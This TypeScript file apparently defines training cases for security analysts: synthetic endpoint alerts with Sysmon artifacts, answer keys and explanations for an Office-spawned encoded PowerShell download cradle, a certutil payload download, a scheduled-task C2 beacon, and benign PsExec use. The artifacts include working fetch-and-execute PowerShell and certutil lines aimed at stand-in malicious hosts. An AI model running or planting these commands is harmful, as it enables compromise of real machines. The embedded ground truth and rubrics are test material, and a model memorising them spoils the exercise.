import type { CaseTemplate } from '../../types.ts';
import { artifact, kvBlock, rubric } from './util.ts';

// ---------------------------------------------------------------------------
// Encoded PowerShell spawned by Office macro (TRUE POSITIVE)
// ---------------------------------------------------------------------------
const encodedPowerShell: CaseTemplate = {
  id: 'endpoint-encoded-powershell',
  category: 'malware',
  difficulty: 'tier2',
  title: 'Word spawns encoded PowerShell',
  cysaDomains: ['1.0', '3.0'],
  build({ rng, faker }) {
    const user = faker.identity();
    const host = faker.laptop();
    const c2 = faker.maliciousDomain();
    const blob = faker.hex(rng.int(60, 80));

    return {
      alert: `EDR (High): "Office application spawned an encoded PowerShell process" on ${host} (${user.username}). Parent winword.exe, child powershell.exe -enc.`,
      context: `${faker.env.company} — macros from the internet are supposed to be blocked, but this file came via a shared drive.`,
      artifacts: [
        artifact(
          'Sysmon — Event ID 1 (Process Create)',
          'kv',
          kvBlock([
            ['UtcTime', faker.iso(0)],
            ['Image', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'],
            ['ParentImage', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'],
            ['User', `${faker.env.adDomain.split('.')[0]}\\${user.username}`],
            ['CommandLine', `powershell.exe -nop -w hidden -enc ${blob}==`],
            ['IntegrityLevel', 'Medium'],
            ['Hashes', `SHA256=${faker.sha256()}`],
          ]),
        ),
        artifact(
          'Decoded -enc payload',
          'raw',
          [
            '$ErrorActionPreference=\'SilentlyContinue\';',
            `IEX (New-Object Net.WebClient).DownloadString('http://${c2}/a')`,
            '# base64 -enc decodes to an in-memory download cradle (IEX).',
          ],
        ),
        artifact(
          'Sysmon — Event ID 3 (Network Connect)',
          'raw',
          [
            `${faker.iso(4)}  powershell.exe -> ${faker.publicIp()}:80  (${c2})`,
            `${faker.iso(6)}  powershell.exe -> ${faker.publicIp()}:443 (${faker.maliciousDomain()})  established`,
          ],
        ),
      ],
      groundTruth: {
        disposition: 'true-positive',
        severity: 'high',
        action: 'escalate',
        techniques: ['T1059.001', 'T1204.002', 'T1027'],
        tactics: ['execution', 'defense-evasion', 'initial-access'],
      },
      rubric: rubric([
        ['parentchild', 'winword.exe -> powershell.exe is an abnormal, high-signal parent/child chain.', ['parent', 'child', 'winword', 'powershell', 'macro']],
        ['flags', '-nop -w hidden -enc is classic malicious tradecraft (hidden, no-profile, encoded).', ['-enc', 'hidden', '-nop', 'encoded', 'flags']],
        ['cradle', 'Decoded payload is an IEX download cradle fetching a second stage.', ['iex', 'download', 'cradle', 'webclient', 'stage']],
        ['isolate', 'Isolate the host, capture the second stage, and hunt for the same document elsewhere.', ['isolate', 'contain', 'second stage', 'hunt', 'ioc']],
      ]),
      explanation: [
        `The parent/child chain is the alarm: a document application (WINWORD.EXE) launching powershell.exe. Users don't do that — macros do. The command line stacks three malicious tells: -nop (no profile), -w hidden (no window), and -enc (base64) to hide intent from casual log review.`,
        `Decoding the blob reveals an IEX download cradle pulling a second stage from ${c2}, and Sysmon Event ID 3 confirms the outbound connections actually happened. So this progressed from execution to active C2 retrieval.`,
        `Escalate and contain: network-isolate ${host}, preserve the process tree and any dropped second stage, block the C2 domains/IPs, and hunt the mail/file-share for the originating document so you can find other victims.`,
      ],
      pitfalls: [
        'Encoded PowerShell alone can occasionally be legitimate tooling — but launched by Word and fetching a remote string, it is not.',
        'Blocking the domain is not containment; the endpoint already executed and must be isolated and examined.',
      ],
      references: [
        { label: 'ATT&CK T1059.001 PowerShell', url: 'https://attack.mitre.org/techniques/T1059/001/' },
      ],
    };
  },
};

// ---------------------------------------------------------------------------
// certutil LOLBin download (TRUE POSITIVE)
// ---------------------------------------------------------------------------
const certutilDownload: CaseTemplate = {
  id: 'endpoint-certutil-download',
  category: 'malware',
  difficulty: 'tier2',
  title: 'certutil used to download a payload',
  cysaDomains: ['1.0', '3.0'],
  build({ rng, faker }) {
    const host = faker.workstation();
    const svc = faker.serviceAccount();
    const url = `http://${faker.publicIp()}/${rng.pick(['update', 'tmp', 'x'])}/${faker.hex(6)}.txt`;
    const out = `C:\\ProgramData\\${faker.hex(5)}.exe`;

    return {
      alert: `EDR (Medium): certutil.exe invoked with -urlcache download flags on ${host}, writing an executable into ProgramData.`,
      context: `${faker.env.company} — living-off-the-land detection fired; certutil is a signed Microsoft binary, which is exactly why attackers abuse it.`,
      artifacts: [
        artifact(
          'Sysmon — Event ID 1 (Process Create)',
          'kv',
          kvBlock([
            ['UtcTime', faker.iso(0)],
            ['Image', 'C:\\Windows\\System32\\certutil.exe'],
            ['ParentImage', 'C:\\Windows\\System32\\cmd.exe'],
            ['User', `${faker.env.adDomain.split('.')[0]}\\${svc}`],
            ['CommandLine', `certutil.exe -urlcache -split -f ${url} ${out}`],
            ['Signed', 'Yes (Microsoft) — legitimate binary, illegitimate use'],
          ]),
        ),
        artifact(
          'Follow-on process + network',
          'raw',
          [
            `${faker.iso(3)}  Event 11 FileCreate: ${out}`,
            `${faker.iso(5)}  Event 1 ProcessCreate: ${out} (child of cmd.exe)`,
            `${faker.iso(7)}  Event 3 Network: ${out.split('\\').pop()} -> ${faker.publicIp()}:443 (${faker.maliciousDomain()})`,
          ],
        ),
      ],
      groundTruth: {
        disposition: 'true-positive',
        severity: 'high',
        action: 'escalate',
        techniques: ['T1105', 'T1140'],
        tactics: ['command-and-control', 'defense-evasion'],
      },
      rubric: rubric([
        ['lolbin', 'certutil -urlcache is a living-off-the-land download (LOLBin), not certificate work.', ['certutil', 'lolbin', 'urlcache', 'living off', 'download']],
        ['dropexec', 'It dropped an EXE into ProgramData which then executed and beaconed.', ['programdata', 'dropped', 'executed', 'exe', 'beacon']],
        ['svcacct', `Running under a service account (${svc}) is unusual for interactive tooling — investigate how it got there.`, ['service account', svc, 'unusual', 'context']],
        ['contain', 'Isolate, capture the dropped file, block the URL/domain, and find the initial access.', ['isolate', 'capture', 'block', 'initial access', 'contain']],
      ]),
      explanation: [
        `certutil is a signed Microsoft certificate utility, but -urlcache -split -f turns it into a file downloader — a classic LOLBin technique to fetch payloads while blending in with trusted binaries. There is no legitimate reason for it to pull a .txt from a bare IP and write an .exe to ProgramData.`,
        `The chain completes: a file is created (Event 11), that new executable runs (Event 1) as a child of cmd, and it beacons out (Event 3). Running under ${svc} is a further oddity worth chasing — how did a service context end up launching this?`,
        `Escalate: isolate ${host}, preserve ${out} for analysis, block the download URL and the beacon domain, and work backwards to the initial access that planted the cmd/certutil activity.`,
      ],
      pitfalls: [
        '"Signed Microsoft binary" is not a clean bill of health — LOLBins are trusted binaries used maliciously.',
        'Confirm whether the dropped file executed; that is the difference between an attempt and a live infection.',
      ],
      references: [
        { label: 'ATT&CK T1105 Ingress Tool Transfer', url: 'https://attack.mitre.org/techniques/T1105/' },
        { label: 'LOLBAS — certutil', url: 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/' },
      ],
    };
  },
};

// ---------------------------------------------------------------------------
// Scheduled task persistence (TRUE POSITIVE)
// ---------------------------------------------------------------------------
const scheduledTask: CaseTemplate = {
  id: 'endpoint-scheduled-task',
  category: 'persistence',
  difficulty: 'tier2',
  title: 'New scheduled task running a hidden script',
  cysaDomains: ['1.0', '3.0'],
  build({ rng, faker }) {
    const host = faker.workstation();
    const user = faker.identity();
    const taskName = rng.pick(['\\Microsoft\\Windows\\UpdateOrchestrator\\SysCheck', '\\GoogleUpdateTaskMachineCoree', '\\OneDriveSync']);
    const script = `C:\\ProgramData\\${faker.hex(5)}\\svc.ps1`;

    return {
      alert: `Event 4698 (A scheduled task was created) on ${host}: a task with a legitimate-sounding name runs a PowerShell script from ProgramData every hour, launched with hidden window.`,
      context: `${faker.env.company} — no change ticket exists for this task; it was created outside the patch window.`,
      artifacts: [
        artifact(
          'Windows Security — Event 4698',
          'kv',
          kvBlock([
            ['Task Name', taskName],
            ['Created by', `${faker.env.adDomain.split('.')[0]}\\${user.username}`],
            ['Trigger', 'Every 1 hour, indefinitely'],
            ['Action', `powershell.exe -ep bypass -w hidden -f ${script}`],
            ['Run level', 'Highest (elevated)'],
            ['Hidden', 'True'],
            ['Author host', host],
          ]),
        ),
        artifact(
          'Task script (excerpt)',
          'raw',
          [
            '# svc.ps1',
            `while($true){ try{ $c = (iwr -useb http://${faker.maliciousDomain()}/c).Content;`,
            '  if($c){ iex $c } }catch{}; Start-Sleep -s 3600 }',
            '# Hourly beacon that executes whatever the server returns.',
          ],
        ),
      ],
      groundTruth: {
        disposition: 'true-positive',
        severity: 'high',
        action: 'escalate',
        techniques: ['T1053.005'],
        tactics: ['persistence', 'execution'],
      },
      rubric: rubric([
        ['masquerade', 'The task name masquerades as a Windows/Google/OneDrive updater but lives in a fake path.', ['masquerade', 'name', 'legitimate-sounding', 'fake', 'updater']],
        ['persistence', 'Hourly trigger + highest run level + hidden = persistence mechanism.', ['persistence', 'hourly', 'trigger', 'hidden', 'scheduled task']],
        ['beacon', 'The script is an hourly beacon that executes server-supplied commands (C2).', ['beacon', 'iex', 'c2', 'iwr', 'command']],
        ['remove', 'Remove the task, capture the script, and determine what created it (root cause).', ['remove', 'delete task', 'root cause', 'capture', 'contain']],
      ]),
      explanation: [
        `Attackers love scheduled tasks for persistence because they survive reboots and hide among legitimate maintenance jobs. This one borrows a trustworthy name (${taskName}) but its action runs powershell -ep bypass -w hidden against a script buried in ProgramData, at the highest run level — none of which a real updater needs.`,
        `The script itself is the proof: an infinite loop that pulls content from a suspicious domain every hour and IEX-executes it. That is a command-and-control beacon wearing a scheduled-task costume.`,
        `Escalate: delete the task and preserve the script for analysis, then find the root cause — a scheduled task is a symptom, so something already had the access to create it. Hunt for the same task name and ProgramData path across the fleet.`,
      ],
      pitfalls: [
        'A familiar task name is not reassurance — check the actual action and file path.',
        'Deleting the task without finding what created it leaves the attacker free to re-establish persistence.',
      ],
      references: [
        { label: 'ATT&CK T1053.005 Scheduled Task', url: 'https://attack.mitre.org/techniques/T1053/005/' },
      ],
    };
  },
};

// ---------------------------------------------------------------------------
// Benign twin: admin using PsExec for a sanctioned deployment (BENIGN)
// ---------------------------------------------------------------------------
const benignAdminTool: CaseTemplate = {
  id: 'endpoint-benign-admin-psexec',
  category: 'malware',
  difficulty: 'tier2',
  title: 'PsExec activity from the management server',
  cysaDomains: ['1.0'],
  build({ faker }) {
    const admin = faker.serviceAccount();
    const mgmt = faker.server('SCCM');
    const targets = [faker.workstation(), faker.workstation(), faker.workstation()];

    return {
      alert: `EDR (Medium): "Remote admin tool (PsExec) executed against multiple hosts" — source ${mgmt}, ${targets.length}+ targets in a short window.`,
      context: `${faker.env.company} — endpoint management runs deployments from ${mgmt}; a change ticket is open for a scripted rollout tonight.`,
      artifacts: [
        artifact(
          'Sysmon — Event ID 1 (source host)',
          'kv',
          kvBlock([
            ['Image', 'C:\\Tools\\SysinternalsSuite\\PsExec64.exe'],
            ['ParentImage', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'],
            ['User', `${faker.env.adDomain.split('.')[0]}\\${admin}`],
            ['CommandLine', `PsExec64.exe @hostlist.txt -s -c install_agent_v${faker.env.internalPrefix.split('.')[1]}.bat`],
            ['Signature', 'Signed — Microsoft/Sysinternals, valid'],
            ['Source host', `${mgmt} (asset role: endpoint management)`],
          ]),
        ),
        artifact(
          'Change / context enrichment',
          'kv',
          kvBlock([
            ['Change ticket', `CHG-${faker.env.internalPrefix.replace('.', '')}${99} (approved)`],
            ['Maintenance window', 'Tonight 20:00–23:00 — matches activity time'],
            ['Operator', `${admin} — known deployment service account`],
            ['Targets', 'Match the CHG scope (pilot ring)'],
            ['Payload', 'Signed internal agent installer (hash on allowlist)'],
            ['Post-exec', 'Agent service installed and healthy; no external connections'],
          ]),
        ),
      ],
      groundTruth: {
        disposition: 'benign',
        severity: 'informational',
        action: 'close',
        techniques: [],
        tactics: [],
      },
      rubric: rubric([
        ['source', `Source is the known management server (${mgmt}) using the sanctioned deployment account.`, ['management', 'sccm', 'source', admin, 'known']],
        ['change', 'An approved change ticket and maintenance window match the activity time and target scope.', ['change', 'ticket', 'chg', 'maintenance window', 'approved']],
        ['payload', 'Payload is a signed internal installer on the allowlist; no external C2.', ['signed', 'allowlist', 'internal', 'installer', 'no external']],
        ['close', 'Benign expected admin activity — confirm against the ticket and close.', ['benign', 'close', 'expected', 'confirm']],
      ]),
      explanation: [
        `PsExec is dual-use: attackers use it for lateral movement, but it is also standard admin tooling. The disposition turns entirely on context, and here the context is clean — the source is the designated management server, the operator is the known deployment service account, and it's pushing a signed internal installer whose hash is allowlisted.`,
        `Crucially, an approved change ticket and maintenance window line up with the time and the exact target scope, and the post-execution state is a healthy agent with no external connections. Compare the malicious-PsExec pattern: an unexpected source workstation, no ticket, credentials used to reach servers the source has no business touching.`,
        `Disposition benign. Verify against the change record and close, noting the ticket number. If sanctioned PsExec from ${mgmt} fires this rule constantly, an allowlist for that source/account is reasonable tuning to cut noise.`,
      ],
      pitfalls: [
        'Do not auto-escalate on the tool name — PsExec from the management host under change control is routine.',
        'The decisive checks are source host, operating account, an approved ticket, and payload allowlisting.',
      ],
      references: [
        { label: 'ATT&CK T1021.002 SMB/Windows Admin Shares', url: 'https://attack.mitre.org/techniques/T1021/002/' },
      ],
    };
  },
};

export const endpointTemplates: CaseTemplate[] = [
  encodedPowerShell,
  certutilDownload,
  scheduledTask,
  benignAdminTool,
];
